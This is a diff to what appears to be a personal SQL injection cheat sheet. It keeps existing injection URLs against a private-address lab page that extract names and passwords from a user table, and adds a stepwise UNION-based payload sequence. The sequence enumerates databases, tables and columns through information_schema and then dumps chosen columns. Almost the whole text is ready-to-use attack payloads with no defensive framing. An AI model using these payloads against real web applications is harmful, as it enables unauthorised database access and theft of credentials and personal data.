@@ -32,3 +32,19 @@ http://10.50.23.102/uniondemo.php?Selection=3 OR 1=1&Submit=Submit
 
 http://10.50.23.102/uniondemo.php?Selection=3 UNION SELECT 1,2,3;
 http://10.50.23.102/uniondemo.php?Selection=3 UNION SELECT name,pass,id from session.user;#
+
+=====================================================================
+#Identify Databases
+'union select 3,table_schema,4 from information_schema.tables union select 5,6,'7
+
+#Identify Tables on a specific database
+'union select 3,table_name,4 from information_schema.tables where table_schema = '<database of interest>' union select 5,6,'7
+
+#Identify Columns on a specific table
+'union select 3,column_name,4 from information_schema.columns where table_name = '<table of interest>' union select 5,6,'7
+
+#Dump infomation from columns of interest
+'union select 3,concat(<columnname>, ":", <columnname>),4 from <tablename> union all select 5,6,'7
+
+#Dump Database way two
+?category=1 UNION SELECT table_name,COLUMN_NAME,4 from information_schema.columns
